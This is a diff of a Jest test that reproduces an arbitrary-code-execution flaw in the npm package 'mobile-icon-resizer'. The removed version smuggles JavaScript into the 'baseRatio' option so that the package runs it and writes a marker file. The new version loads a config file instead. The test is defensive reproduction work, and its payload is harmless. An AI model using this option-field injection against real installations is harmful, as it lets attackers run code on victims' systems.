@@ -1,32 +1,26 @@
-test("Arbitrary code execution in mobile-icon-resizer", () => {
+test("Arbitrary code execution in mobile-icon-resizer", (done) => {
   expect.assertions(2);
   const fs = require("fs");
+  const pathM = require("path");
   const resize = require("mobile-icon-resizer");
   const path = "./mobile-icon-resizer";
+  
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
+  
   let options = {
-    android: {
-      images: [
-        {
-          baseRatio: require("fs").writeFileSync("mobile-icon-resizer", ``),
-          folder: "drawable-mdpi",
-        },
-        {
-          baseRatio: "4",
-          folder: "drawable-xxxhdpi",
-        },
-        {
-          size: "512x512",
-          folder: "WEB",
-        },
-      ],
-    },
+    config: pathM.resolve(__dirname, "./config")
   };
+  
   try {
     resize(options, function (err) {});
-  } catch (e) {}
+  } catch (e) {console.log(e)}
+  
   file_exist = fs.existsSync(path);
-  expect(file_exist).toBe(true);
-  fs.unlink(path, function (err) {});
+  
+  setTimeout(() => {
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+    done();
+  }, 500);
 });
